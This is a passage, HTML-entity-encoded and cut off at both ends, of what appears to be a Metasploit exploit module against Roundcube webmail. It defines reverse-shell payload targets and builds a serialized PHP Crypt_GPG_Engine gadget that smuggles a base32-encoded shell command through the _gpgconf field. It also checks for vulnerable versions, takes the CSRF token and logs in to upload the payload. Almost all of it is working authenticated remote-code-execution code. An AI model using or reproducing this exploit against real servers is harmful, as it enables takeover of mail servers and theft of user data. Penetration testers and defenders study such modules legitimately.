ATABLE_SESSION] &#125;, &#x27;Platform&#x27; =&gt; [&#x27;unix&#x27;, &#x27;linux&#x27;], &#x27;Targets&#x27; =&gt; [ [ &#x27;Linux Dropper&#x27;, &#123; &#x27;Platform&#x27; =&gt; &#x27;linux&#x27;, &#x27;Arch&#x27; =&gt; [ARCH_X64, ARCH_X86, ARCH_ARMLE, ARCH_AARCH64], &#x27;Type&#x27; =&gt; :linux_dropper, &#x27;DefaultOptions&#x27; =&gt; &#123; &#x27;PAYLOAD&#x27; =&gt; &#x27;linux/x64/meterpreter/reverse_tcp&#x27; &#125; &#125; ], [ &#x27;Linux Command&#x27;, &#123; &#x27;Platform&#x27; =&gt; [&#x27;unix&#x27;, &#x27;linux&#x27;], &#x27;Arch&#x27; =&gt; [ARCH_CMD], &#x27;Type&#x27; =&gt; :nix_cmd, &#x27;DefaultOptions&#x27; =&gt; &#123; &#x27;PAYLOAD&#x27; =&gt; &#x27;cmd/unix/reverse_bash&#x27; &#125; &#125; ] ], &#x27;DefaultTarget&#x27; =&gt; 0 ) ) register_options( [ OptString.new(&#x27;USERNAME&#x27;, [true, &#x27;Email User to login with&#x27;, &#x27;&#x27; ]), OptString.new(&#x27;PASSWORD&#x27;, [true, &#x27;Password to login with&#x27;, &#x27;&#x27; ]), OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;The URI of the Roundcube Application&#x27;, &#x27;/&#x27; ]), OptString.new(&#x27;HOST&#x27;, [false, &#x27;The hostname of Roundcube server&#x27;, &#x27;&#x27;]), OptInt.new(&#x27;TIMEOUT&#x27;, [false, &#x27;Time to wait for session (in seconds)&#x27;, 3 ]) ] ) end class PhpPayloadBuilder def initialize(command) @encoded = Rex::Text.encode_base32(command) @gpgconf = %(echo &quot;#&#123;@encoded&#125;&quot;|base32 -d|sh;#) end def build len = @gpgconf.bytesize %(|O:16:&quot;Crypt_GPG_Engine&quot;:3:&#123;s:8:&quot;_process&quot;;b:0;s:8:&quot;_gpgconf&quot;;s:#&#123;len&#125;:&quot;#&#123;@gpgconf&#125;&quot;;s:8:&quot;_homedir&quot;;s:0:&quot;&quot;;&#125;;) end end def fetch_login_page res = send_request_cgi( &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path), &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;keep_cookies&#x27; =&gt; true, &#x27;vars_get&#x27; =&gt; &#123; &#x27;_task&#x27; =&gt; &#x27;login&#x27; &#125; ) fail_with(Failure::Unreachable, &quot;#&#123;peer&#125; - No response from web service&quot;) unless res fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unexpected HTTP code #&#123;res.code&#125;&quot;) unless res.code == 200 res end def check res = fetch_login_page unless res.body =~ /&quot;rcversion&quot;\s*:\s*(\d+)/ fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unable to extract version number&quot;) end version = Rex::Version.new(Regexp.last_match(1).to_s) print_good(&quot;Extracted version: #&#123;version&#125;&quot;) if version.between?(Rex::Version.new(10100), Rex::Version.new(10509)) return CheckCode::Appears elsif version.between?(Rex::Version.new(10600), Rex::Version.new(10610)) return CheckCode::Appears end CheckCode::Safe end def build_serialized_payload print_status(&#x27;Preparing payload...&#x27;) stager = case target[&#x27;Type&#x27;] when :nix_cmd payload.encoded when :linux_dropper generate_cmdstager.join(&#x27;;&#x27;) else fail_with(Failure::BadConfig, &#x27;Unsupported target type&#x27;) end serialized = PhpPayloadBuilder.new(stager).build.gsub(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;) print_good(&#x27;Payload successfully generated and serialized.&#x27;) serialized end def exploit token = fetch_csrf_token login(token) payload_serialized = build_serialized_payload upload_payload(payload_serialized) end def fetch_csrf_token print_status(&#x27;Fetching CSRF token...&#x27;) res = fetch_login_page html = res.get_html_document token_input = html.at(&#x27;input[name=&quot;_token&quot;]&#x27;) unless token_input fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unable to extract CSRF token&quot;) end token = token_input[&#x27;value&#x27;] if token.nil? || token.empty? fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - CSRF token is empty&quot;) end print_good(&quot;Extracted token: #&#123;token&#125;&quot;) token end def login(token) print_status(&#x27;Attempting login...&#x27;) vars_post = &#123; &#x27;_token&#x27; =&gt; token, 